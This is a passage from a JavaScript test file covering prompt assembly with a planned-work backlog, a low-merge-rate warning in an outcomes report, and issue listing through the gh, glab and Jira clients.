    expect(p).toContain('### goals');
  });

  it('puts the guidance AFTER the backlog it refers to', () => {
    const p = buildPrompt({ app, config, sources: { plannedWork: 'PLANNED BACKLOG' } });
    expect(p.indexOf('PLANNED BACKLOG')).toBeLessThan(p.indexOf(PLANNED_WORK_GUIDANCE));
  });

  it('still surfaces the "could not be read" sentinel to the reasoner', () => {
    const p = buildPrompt({ app, config, sources: { plannedWork: plannedWorkUnavailable('the gh issue list failed') } });
    expect(p).toContain('### plannedWork');
    expect(p).toContain('could NOT be read');
    expect(p).toContain(PLANNED_WORK_GUIDANCE);
  });

  it('omits the block entirely when the source produced nothing', () => {
    expect(buildPrompt({ app, config, sources: { goals: 'g' } })).not.toContain('### plannedWork');
    expect(buildPrompt({ app, config, sources: { plannedWork: '   ' } })).not.toContain('### plannedWork');
  });

  it('does not claim "no sources available" while rendering a populated plannedWork block', () => {
    // plannedWork is excluded from sourceBlocks so its guidance stays anchored —
    // the empty-sources fallback must not therefore contradict the block below it.
    const p = buildPrompt({ app, config, sources: { plannedWork: '1 item(s):\n- #3 Ship X' } });
    expect(p).toContain('- #3 Ship X');
    expect(p).toContain('(no other sources available');
    // Still says the plain thing when there is genuinely nothing at all.
    expect(buildPrompt({ app, config, sources: {} })).toContain('(no sources available');
  });
});

describe('computeOutcomesReport low-merge-rate warning (#2698)', () => {
  const filed = (outcome) => ({ scope: 'app-improvement', outcome });
  const rejected = (n) => Array.from({ length: n }, () => filed('rejected'));

  it('warns and points at plannedWork when the resolved merge rate is below the threshold', () => {
    // 0 of 4 resolved merged → 0% < 20%, and 4 clears the sample floor.
    const report = computeOutcomesReport({ outcomes: [...rejected(3), filed('abandoned')], hasPlannedWork: true });
    expect(report).toContain('WARNING');
    expect(report).toContain('merge rate is critically low');
    expect(report).toContain('plannedWork');
    expect(report).toContain('0 of 4 resolved proposals (0%)');
  });

  it('stays silent when the merge rate is healthy', () => {
    const report = computeOutcomesReport({ outcomes: [filed('merged'), filed('merged'), filed('rejected'), filed('merged')] });
    expect(report).not.toContain('WARNING');
  });

  it('stays silent when NOTHING is resolved yet (pending ≠ rejected)', () => {
    // Filed, all still open: 0 merged of 0 resolved. Dividing by `total` would
    // render 0% and alarm — but nothing has actually failed.
    const report = computeOutcomesReport({ outcomes: [filed(null), filed(null), filed(null), filed(null), filed(null)] });
    expect(report).toContain('Total filed: 5');
    expect(report).not.toContain('WARNING');
  });

  it('measures over resolved proposals, not total (a pending backlog cannot trip it)', () => {
    // 1 merged of 1 resolved = 100% → healthy, despite 1/5 = 20% of total.
    const report = computeOutcomesReport({ outcomes: [filed('merged'), filed(null), filed(null), filed(null), filed(null)] });
    expect(report).not.toContain('WARNING');
  });

  it('stays silent below the sample floor — 0-of-1 is not evidence of a rate', () => {
    // A single early rejection must not tell the loop to stop proposing: it can
    // never earn a merge if it stops filing.
    for (let n = 1; n < LOW_MERGE_RATE_MIN_SAMPLE; n += 1) {
      expect(computeOutcomesReport({ outcomes: rejected(n), hasPlannedWork: true })).not.toContain('WARNING');
    }
    expect(computeOutcomesReport({ outcomes: rejected(LOW_MERGE_RATE_MIN_SAMPLE), hasPlannedWork: true })).toContain('WARNING');
    expect(LOW_MERGE_RATE_MIN_SAMPLE).toBe(4);
  });

  it('fires exactly below the documented threshold', () => {
    // 1 merged of 5 resolved = 20% → NOT below 20 → silent.
    const at = computeOutcomesReport({ outcomes: [filed('merged'), ...rejected(4)] });
    expect(at).not.toContain('WARNING');
    // 1 merged of 6 resolved = 17% → below → warns.
    const below = computeOutcomesReport({ outcomes: [filed('merged'), ...rejected(5)] });
    expect(below).toContain('WARNING');
    expect(LOW_MERGE_RATE_THRESHOLD).toBe(20);
  });

  it('compares the RAW rate — a sub-threshold rate that rounds up still warns', () => {
    // 10 merged of 51 resolved = 19.6% — genuinely below 20, but rounds to 20.
    // Rounding before the comparison would suppress the warning entirely.
    const report = computeOutcomesReport({
      outcomes: [...Array.from({ length: 10 }, () => filed('merged')), ...rejected(41)]
    });
    expect(report).toContain('WARNING');
    // ...while the DISPLAYED figure is still the friendly rounded one.
    expect(report).toContain('10 of 51 resolved proposals (20%)');
  });

  it('does NOT cite a plannedWork block that is not in the prompt', () => {
    // The source is per-app-toggleable and yields nothing on an unresolvable
    // tracker — citing a section that isn't there is just noise.
    const report = computeOutcomesReport({ outcomes: rejected(5), hasPlannedWork: false });
    expect(report).toContain('WARNING');
    expect(report).not.toContain('plannedWork');
    expect(report).toContain('return proposal: null');
  });

  it('still returns "" with no filed history (nothing to calibrate on)', () => {
    expect(computeOutcomesReport({ outcomes: [] })).toBe('');
  });
});

describe('listForgeIssues label/state parameterization (#2698)', () => {
  it('defaults to the LI label across all states', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '[]' });
    await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    const args = exec.mock.calls[0][1];
    expect(args).toContain(LI_LABEL);
    expect(args).toContain('--state');
    expect(args[args.indexOf('--state') + 1]).toBe('all');
  });

  it('queries the requested label + state (gh)', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '[]' });
    await listForgeIssues({ cli: 'gh', cwd: '/x', label: 'plan', state: 'open', exec });
    const args = exec.mock.calls[0][1];
    expect(args).toContain('plan');
    expect(args).not.toContain(LI_LABEL);
    expect(args[args.indexOf('--state') + 1]).toBe('open');
    expect(args[args.indexOf('--json') + 1]).toContain('labels');
  });

  it('drops --all for an open-only glab query (glab lists open by default)', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '[]' });
    await listForgeIssues({ cli: 'glab', cwd: '/x', label: 'plan', state: 'open', exec });
    expect(exec.mock.calls[0][1]).not.toContain('--all');
    await listForgeIssues({ cli: 'glab', cwd: '/x', exec });
    expect(exec.mock.calls[1][1]).toContain('--all');
  });

  it('normalizes labels from both forges', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([{ number: 1, title: 'A', state: 'open', labels: [{ name: 'plan' }] }])
    });
    const { issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(issues[0].labels).toEqual(['plan']);
  });

  it('reports [] labels when the forge omits the field (never undefined)', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: JSON.stringify([{ number: 1, title: 'A', state: 'open' }]) });
    const { issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(issues[0].labels).toEqual([]);
  });
});

describe('listJiraIssues jql override (#2698)', () => {
  it('defaults to the LI-label JQL and passes no search options', async () => {
    const search = vi.fn().mockResolvedValue([]);
    await listJiraIssues({ instanceId: 'i1', projectKey: 'PROJ', search });
    expect(search).toHaveBeenCalledWith('i1', expect.stringContaining(`labels = "${LI_LABEL}"`));
  });

  it('uses an explicit jql + search options when given', async () => {
    const search = vi.fn().mockResolvedValue([]);
    await listJiraIssues({
      instanceId: 'i1', projectKey: 'PROJ', jql: 'CUSTOM JQL', searchOptions: { fields: 'summary,priority' }, search
    });
    expect(search).toHaveBeenCalledWith('i1', 'CUSTOM JQL', { fields: 'summary,priority' });
  });

  it('maps priority + labels, and keeps an absent priority null', async () => {
    const search = vi.fn().mockResolvedValue([
      { key: 'PROJ-1', summary: 'A', statusCategory: 'To Do', priority: 'High', labels: ['plan'] },
      { key: 'PROJ-2', summary: 'B', statusCategory: 'To Do' }
    ]);
    const { issues } = await listJiraIssues({ instanceId: 'i1', projectKey: 'PROJ', search });
    expect(issues[0].priority).toBe('High');
    expect(issues[0].labels).toEqual(['plan']);
    expect(issues[1].priority).toBeNull();
    expect(issues[1].labels).toEqual([]);
  });
});
